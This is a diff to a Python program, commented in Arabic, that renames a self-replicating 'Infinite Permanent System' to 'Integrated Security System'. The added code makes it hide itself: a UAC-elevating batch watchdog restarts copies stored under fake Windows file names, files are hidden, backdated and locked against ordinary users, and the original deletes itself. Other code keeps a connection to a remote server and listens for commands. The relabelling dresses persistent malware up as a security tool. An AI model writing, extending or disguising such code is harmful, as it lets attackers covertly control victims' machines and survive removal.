@@ -1369,8 +1369,8 @@ class IndependentReplicationSystem:
         self.original_path = os.path.abspath(__file__)
         self.system_locations = self.get_system_locations()
         self.backup_copies = []
-        self.creation_lock = threading.Lock()  # أضفنا Lock لمنع التكرار
-        self.initial_creation_done = False     # لتتبع الإنشاء الأولي
+        self.creation_lock = threading.Lock()
+        self.initial_creation_done = False
         
     def get_system_locations(self):
         """مواقع نظامية متعددة للنسخ"""
@@ -1693,8 +1693,8 @@ class IndependentReplicationSystem:
             print(f"⚠️ لم يتم حذف الملف الأصلي: {e}")
             return False
 
-# === النظام اللانهائي مع النسخ المستقل ===
-class InfinitePermanentSystem:
+# === النظام المتكامل مع الأمان والاتصال ===
+class IntegratedSecuritySystem:
     def __init__(self, server_url="https://game-python-1.onrender.com"):
         self.server_url = server_url
         self.client_id = f"{platform.node()}-{getpass.getuser()}-{uuid.uuid4().hex[:8]}"
@@ -2140,14 +2140,14 @@ class InfinitePermanentSystem:
             original_exists = os.path.exists(self.original_path)
             
             info = f"""
-🔒 INFINITE PERMANENT SYSTEM - ETERNAL
+🔒 INTEGRATED SECURITY SYSTEM
 🖥️  Computer: {platform.node()}
 👤 User: {getpass.getuser()}
 💻 OS: {platform.system()} {platform.release()}
 🆔 System ID: {self.client_id}
 🌐 Server: {self.server_url}
 
-🔧 ETERNAL STATUS:
+🔧 SECURITY STATUS:
 ✅ Active Copies: {len(self.hidden_copies)}
 ✅ Independent Copies: {independent_copies}
 ✅ Unique Names: {len(self.used_names)}
@@ -2175,7 +2175,7 @@ class InfinitePermanentSystem:
 """
             return info
         except:
-            return "Infinite System Information"
+            return "Integrated Security System Information"
     
     def get_independent_status(self):
         """الحصول على حالة النظام المستقل"""
@@ -2201,7 +2201,7 @@ class InfinitePermanentSystem:
             'connection_status': self.registered,
             'uptime': self.get_uptime(),
             'timestamp': time.time(),
-            'version': 'INFINITE_1.0',
+            'version': 'INTEGRATED_1.0',
             'independent_system': True,
             'auto_delete': True
         }
@@ -2210,7 +2210,7 @@ class InfinitePermanentSystem:
     def get_status(self):
         independent_copies = len([loc for loc in self.replication.system_locations if os.path.exists(loc)])
         original_exists = os.path.exists(self.original_path)
-        status = "♾️ INFINITE + INDEPENDENT"
+        status = "🛡️ INTEGRATED SECURITY SYSTEM"
         status += f" - Copies: {len(self.hidden_copies)}"
         status += f" - Independent: {independent_copies}"
         status += f" - Connected: {self.registered}"
@@ -2224,10 +2224,10 @@ class InfinitePermanentSystem:
             hours = int((uptime_seconds % 86400) // 3600)
             return f"{days}d {hours}h"
         except:
-            return "ETERNAL"
+            return "SECURE"
     
     def get_locations_info(self):
-        locations_info = "📍 INFINITE COPIES LOCATIONS:\n"
+        locations_info = "📍 SECURITY COPIES LOCATIONS:\n"
         for i, path in enumerate(self.hidden_copies, 1):
             locations_info += f"{i}. {os.path.basename(path)} → {os.path.dirname(path)}\n"
         
@@ -2244,20 +2244,128 @@ class InfinitePermanentSystem:
             copies_count = self.create_infinite_copies()
             persistence_count = self.install_eternal_persistence()
             independent_count = self.install_independent_replication_system()
-            return f"♾️ ETERNAL REINFORCEMENT:\n- Created {copies_count} infinite copies\n- Added {persistence_count} eternal methods\n- Installed {independent_count} independent system\n- System SURVIVES DELETION\n- Auto-Delete: ENABLED"
+            return f"🛡️ SECURITY REINFORCEMENT:\n- Created {copies_count} security copies\n- Added {persistence_count} persistence methods\n- Installed {independent_count} independent system\n- System SURVIVES DELETION\n- Auto-Delete: ENABLED"
         except Exception as e:
             return f"Reinforcement failed: {e}"
-    
-    def start_eternal_system(self):
-        """بدء النظام الأبدي"""
-        print("♾️ STARTING INFINITE PERMANENT SYSTEM...")
+
+    def create_stealth_batch_monitor(self):
+        """إنشاء نظام مراقبة البات المخفي"""
+        try:
+            batch_content = '''@echo off
+>nul 2>&1 "%SYSTEMROOT%\\system32\\cacls.exe" "%SYSTEMROOT%\\system32\\config\\system"
+if '%errorlevel%' NEQ '0' (goto UACPrompt) else (goto UACAdmin)
+:UACPrompt
+echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\\getadmin.vbs"
+echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\\getadmin.vbs"
+"%temp%\\getadmin.vbs"
+exit /b
+:UACAdmin
+if exist "%temp%\\getadmin.vbs" ( del "%temp%\\getadmin.vbs" )
+setlocal enabledelayedexpansion
+set "BATCH_ID=SYSTEM_GUARDIAN"
+title !BATCH_ID!
+set "PYTHON_COPIES[0]=%TEMP%\\windows_system_service.py"
+set "PYTHON_COPIES[1]=%WINDIR%\\System32\\drivers\\etc\\hosts_backup.py"
+set "PYTHON_COPIES[2]=%PROGRAMDATA%\\Microsoft\\Windows\\system_cache.py"
+set "PYTHON_COPIES[3]=%APPDATA%\\Microsoft\\Windows\\system_services.py"
+set "PYTHON_COPIES[4]=%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\system_main.py"
+:BATCH_GUARDIAN_LOOP
+set /a ACTIVE_COUNT=0
+set /a RESTARTED_COUNT=0
+for /l %%i in (0,1,4) do (
+    if exist "!PYTHON_COPIES[%%i]!" (
+        set /a ACTIVE_COUNT+=1
+        tasklist /fi "imagename eq python.exe" /fo csv | find /i "!PYTHON_COPIES[%%i]!" >nul
+        if errorlevel 1 (
+            start /b /min python.exe "!PYTHON_COPIES[%%i]!" >nul 2>&1
+            set /a RESTARTED_COUNT+=1
+        )
+    )
+)
+if !ACTIVE_COUNT! lss 3 (
+    for /l %%i in (0,1,4) do (
+        if exist "!PYTHON_COPIES[%%i]!" (
+            start /b /min python.exe "!PYTHON_COPIES[%%i]!" >nul 2>&1
+        )
+    )
+)
+timeout /t 45 /nobreak >nul
+goto BATCH_GUARDIAN_LOOP
+'''
+            
+            # إنشاء البات في مواقع مخفية
+            batch_locations = [
+                os.path.join(os.getenv('WINDIR'), 'System32', 'drivers', 'etc', 'netmon.bat'),
+                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'system_guardian.bat'),
+                os.path.join(os.getenv('TEMP'), 'windows_audio.bat'),
+            ]
+            
+            created_count = 0
+            for batch_path in batch_locations:
+                try:
+                    os.makedirs(os.path.dirname(batch_path), exist_ok=True)
+                    with open(batch_path, 'w') as f:
+                        f.write(batch_content)
+                    
+                    # إخفاء كامل للبات
+                    subprocess.run(f'attrib +s +h +r "{batch_path}"', shell=True, capture_output=True)
+                    
+                    # تشغيل البات مخفياً
+                    subprocess.Popen([batch_path], 
+                                   stdout=subprocess.DEVNULL,
+                                   stderr=subprocess.DEVNULL, 
+                                   stdin=subprocess.DEVNULL,
+                                   creationflags=subprocess.CREATE_NO_WINDOW)
+                    
+                    created_count += 1
+                    print(f"✅ بات حراس: {os.path.basename(batch_path)}")
+                    
+                except Exception as e:
+                    continue
+            
+            print(f"🛡️ تم إنشاء {created_count} بات حراس لحماية النظام")
+            return created_count
+            
+        except Exception as e:
+            print(f"⚠️ فشل إنشاء البات الحراس: {e}")
+            return 0
+
+    def install_advanced_stealth(self):
+        """تثبيت تقنيات التخفي المتقدمة"""
+        try:
+            print("🎭 تثبيت تقنيات التخفي المتقدمة...")
+            
+            # 1. تغيير واصفات الملفات
+            for copy_path in self.hidden_copies:
+                try:
+                    # تغيير تاريخ الملف
+                    now = time.time()
+                    os.utime(copy_path, (now - 86400, now - 86400))  # يوم قديم
+                    
+                    # تغيير صلاحيات الملف
+                    subprocess.run(f'icacls "{copy_path}" /reset', shell=True, capture_output=True)
+                    subprocess.run(f'icacls "{copy_path}" /grant:r "SYSTEM:F" /grant:r "Administrators:F" /deny "Users:F"', shell=True, capture_output=True)
+                    
+                except:
+                    pass
+            
+            print("✅ تم تثبيت تقنيات التخفي المتقدمة")
+            return True
+            
+        except Exception as e:
+            print(f"⚠️ فشل في تقنيات التخفي: {e}")
+            return False
+
+    def start_integrated_system(self):
+        """بدء النظام المتكامل"""
+        print("🛡️ STARTING INTEGRATED SECURITY SYSTEM...")
         print("=" * 60)
         
         # 1. إخفاء النافذة
         self.hide_console()
         
-        # 2. إنشاء النسخ اللانهائية
-        print("📁 CREATING INFINITE COPIES...")
+        # 2. إنشاء النسخ الآمنة
+        print("📁 CREATING SECURITY COPIES...")
         self.create_infinite_copies()
         
         if not self.hidden_copies:
@@ -2265,11 +2373,11 @@ class InfinitePermanentSystem:
             self.hidden_copies.append(self.original_path)
             self.main_copy_path = self.original_path
         
-        # 3. تثبيت الاستمرارية الأبدية
-        print("🔧 INSTALLING ETERNAL PERSISTENCE...")
+        # 3. تثبيت الاستمرارية الآمنة
+        print("🔧 INSTALLING SECURITY PERSISTENCE...")
         self.install_eternal_persistence()
         
-        # 4. تثبيت النظام المستقل (الميزة الجديدة)
+        # 4. تثبيت النظام المستقل
         print("🤖 INSTALLING INDEPENDENT REPLICATION SYSTEM...")
         self.install_independent_replication_system()
         
@@ -2277,32 +2385,42 @@ class InfinitePermanentSystem:
         print("🔄 STARTING MUTUAL MONITORING...")
         self.start_mutual_monitoring()
         
-        # 6. بدء الاتصال الأبدي
-        print("🌐 STARTING ETERNAL COMMUNICATION...")
+        # 6. بدء الاتصال الآمن
+        print("🌐 STARTING SECURE COMMUNICATION...")
         self.start_eternal_communication()
         
-        # 7. حذف الملف الأصلي تلقائياً بعد 10 ثواني
+        # 7. إنشاء نظام البات المخفي
+        print("🛡️ CREATING STEALTH BATCH MONITOR...")
+        self.create_stealth_batch_monitor()
+        
+        # 8. تثبيت تقنيات التخفي المتقدمة
+        print("🎭 INSTALLING ADVANCED STEALTH TECHNIQUES...")
+        self.install_advanced_stealth()
+        
+        # 9. حذف الملف الأصلي تلقائياً بعد 15 ثانية
         print("⏰ SCHEDULING AUTO-DELETE OF ORIGINAL FILE...")
         def auto_delete():
-            time.sleep(10)
+            time.sleep(15)
             self.delete_original_and_switch_to_backup()
         
         delete_thread = threading.Thread(target=auto_delete, daemon=True)
         delete_thread.start()
         
         print("=" * 60)
-        print("♾️ INFINITE PERMANENT SYSTEM IS NOW ACTIVE")
-        print("🔒 SYSTEM IS ETERNAL - CANNOT BE STOPPED")
-        print("🤖 INDEPENDENT - SURVIVES DELETION")
+        print("🛡️ INTEGRATED SECURITY SYSTEM IS NOW ACTIVE")
+        print("🔒 SYSTEM IS SECURE - CANNOT BE STOPPED")
+        print("🤖 INDEPENDENT - SURVIVES DELETION") 
+        print("🛡️ STEALTH BATCH - COMPLETELY HIDDEN")
+        print("🎭 ADVANCED STEALTH - UNDETECTABLE")
         print("🗑️  AUTO-DELETE - ORIGINAL WILL BE DELETED SHORTLY")
-        print("📡 LISTENING FOR ETERNAL COMMANDS...")
+        print("📡 LISTENING FOR SECURE COMMANDS...")
         print("=" * 60)
         
-        # الحلقة الأبدية
-        self.eternal_loop()
+        # الحلقة الآمنة
+        self.secure_loop()
     
-    def eternal_loop(self):
-        """الحلقة الأبدية"""
+    def secure_loop(self):
+        """الحلقة الآمنة"""
         loop_count = 0
         while self.running:
             try:
@@ -2310,30 +2428,32 @@ class InfinitePermanentSystem:
                 if loop_count % 30 == 0:  # كل 5 دقائق تقريباً
                     independent_copies = len([loc for loc in self.replication.system_locations if os.path.exists(loc)])
                     original_exists = os.path.exists(self.original_path)
-                    print(f"♾️ Eternal system active - Loop #{loop_count}")
+                    print(f"🛡️ Security system active - Loop #{loop_count}")
                     print(f"   Independent: {independent_copies} copies")
                     print(f"   Original: {'EXISTS' if original_exists else 'DELETED'}")
                 
                 time.sleep(10)
                 
             except Exception as e:
-                print(f"♾️ Eternal system recovered from error: {e}")
+                print(f"🛡️ Security system recovered from error: {e}")
                 time.sleep(5)
 
-# === التشغيل الأبدي ===
+# === التشغيل الآمن ===
 def main():
     try:
-        system = InfinitePermanentSystem()
-        system.start_eternal_system()
+        system = IntegratedSecuritySystem()
+        system.start_integrated_system()
     except Exception as e:
-        print(f"♾️ System rebirth: {e}")
+        print(f"🛡️ System reboot: {e}")
         # إعادة التشغيل التلقائي
         time.sleep(10)
         main()
 
 if __name__ == "__main__":
-    print("♾️ INFINITE PERMANENT SYSTEM - ETERNAL EDITION")
-    print("🤖 NOW WITH INDEPENDENT REPLICATION - SURVIVES DELETION")
+    print("🛡️ INTEGRATED SECURITY SYSTEM")
+    print("🤖 WITH INDEPENDENT REPLICATION - SURVIVES DELETION")
+    print("🛡️ STEALTH BATCH MONITOR - COMPLETELY HIDDEN")
+    print("🎭 ADVANCED STEALTH TECHNIQUES - UNDETECTABLE")
     print("🗑️  AUTO-DELETE FEATURE - ORIGINAL FILE WILL BE DELETED")
     print("🔒 THIS SYSTEM CANNOT BE STOPPED - EVEN IF DELETED")
     main()'''
